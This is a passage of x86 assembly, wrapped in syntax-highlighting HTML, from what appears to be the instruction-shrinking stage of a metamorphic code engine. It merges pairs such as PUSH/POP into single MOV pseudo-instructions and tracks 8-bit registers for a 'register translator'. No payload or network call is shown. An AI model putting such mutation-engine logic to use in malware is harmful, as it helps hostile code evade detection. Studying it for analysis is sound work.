                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Single_Next27_Common</span><span class="sc0">

      </span><span class="sc5">@@Single_Next31</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc5">@@Single_End</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;; Once here we check if it's a 8 bits instruction. If it's the case,</span><span class="sc0">
</span><span class="sc1">;; we save for later the register it's using (concretely, for register</span><span class="sc0">
</span><span class="sc1">;; translation). The last one stored here is the one we are using along</span><span class="sc0">
</span><span class="sc1">;; the engine.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">; Check if it's a 8 bits opcode</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Check_Double</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Check_Double</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; If it is, check if it's MOV Reg,Imm,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GetFrom_RegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; MOV Reg,Reg,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GetFrom_RegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; MOV Reg,Mem or</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GetFrom_RegMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; MOV Mem,Reg, and then we get the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Check_Double</span><span class="sc0"> </span><span class="sc1">; register and save it, having then</span><span class="sc0">
      </span><span class="sc5">@@GetFrom_MemReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the 8 bits register that we are using</span><span class="sc0">
      </span><span class="sc5">@@GetFrom_RegMem</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; along the code. This register must be</span><span class="sc0">
      </span><span class="sc5">@@GetFrom_RegReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; treated specially by the register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; translator of the expander, because must</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; be one of the general use registers</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetFrom_OK</span><span class="sc0">   </span><span class="sc1">; (EAX, ECX, EDX and EBX)</span><span class="sc0">
      </span><span class="sc5">@@GetFrom_RegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
      </span><span class="sc5">@@GetFrom_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Register8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save the register</span><span class="sc0">


</span><span class="sc1">;;; Pairs of instructions. We try to match known pairs to merge them to the</span><span class="sc0">
</span><span class="sc1">;;; simple one-instruction form.</span><span class="sc0">
      </span><span class="sc5">@@Check_Double</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP</span><span class="sc0">   </span><span class="sc1">; Increase pointer and get the second</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; instruction.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndNoCompressed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndNoCompressed</span><span class="sc0"> </span><span class="sc1">; We don't join instructions with</span><span class="sc0">
                                        </span><span class="sc1">; labels on them.</span><span class="sc0">
             </span><span class="sc1">;; Pair to check is at &lt;[esi],[edi]&gt;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; Check pair with PUSH Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; PUSH Imm/POP Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_PutMOVRegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">     </span><span class="sc1">; PUSH Imm/POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndNoCompressed</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_PutMOVMemImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">     </span><span class="sc1">; Set MOV Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_PutMOVRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Set MOV Reg,Imm</span><span class="sc0">
      </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Set NOP at second instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">

      </span><span class="sc5">@@Double_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">; Check pair beginning with PUSH Reg</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; PUSH Reg/POP Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_PushPop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; PUSH Reg/RET?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next00_JMPReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">     </span><span class="sc1">; PUSH Reg/POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">; If PUSH Reg/POP Mem, set MOV Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_PushPop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">     </span><span class="sc1">; If PUSH Reg/POP Reg, set MOV Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next00_JMPReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">    </span><span class="sc1">; If PUSH Reg/RET, set JMP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">     </span><span class="sc1">; Check pair beginning with PUSH Mem</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next02</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; PUSH Mem/POP Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next01_PushPop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">     </span><span class="sc1">; PUSH Mem/POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next01_MOVMemMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">     </span><span class="sc1">; If PUSH Mem/POP Mem, MOV Mem,Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next01_PushPop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">     </span><span class="sc1">; If PUSH Mem/POP Reg, set MOV Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next_NoMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; If bytes from +1 to +6 coincides,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; it can be a memory operation with</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next_NoMem</span><span class="sc0"> </span><span class="sc1">; the same memory variable. If not,</span><span class="sc0">
                                        </span><span class="sc1">; just jump to check other things</span><span class="sc0">

    </span><span class="sc1">; From now and while we are checking memory variable using instructions,</span><span class="sc0">
    </span><span class="sc1">; we are sure that they use the same memory variable.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">       </span><span class="sc1">; Check if it's APICALL_STORE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_Check</span><span class="sc0">   </span><span class="sc1">; If it is, jump (it's just like</span><span class="sc0">
                                              </span><span class="sc1">; a MOV Mem,Reg)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">        </span><span class="sc1">; MOV Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next03</span><span class="sc0">
      </span><span class="sc5">@@Double_Next02_Check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the second instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">       </span><span class="sc1">; PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_PushReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">       </span><span class="sc1">; OP Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Double_Next_OPRegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">      </span><span class="sc1">; CALL Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_CALLMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">      </span><span class="sc1">; JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_JMPMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">      </span><span class="sc1">; MOV Mem,Reg + JMP Mem = JMP Reg</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_XXXMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_CALLMem</span><span class="sc4">:</span><span class="sc0">
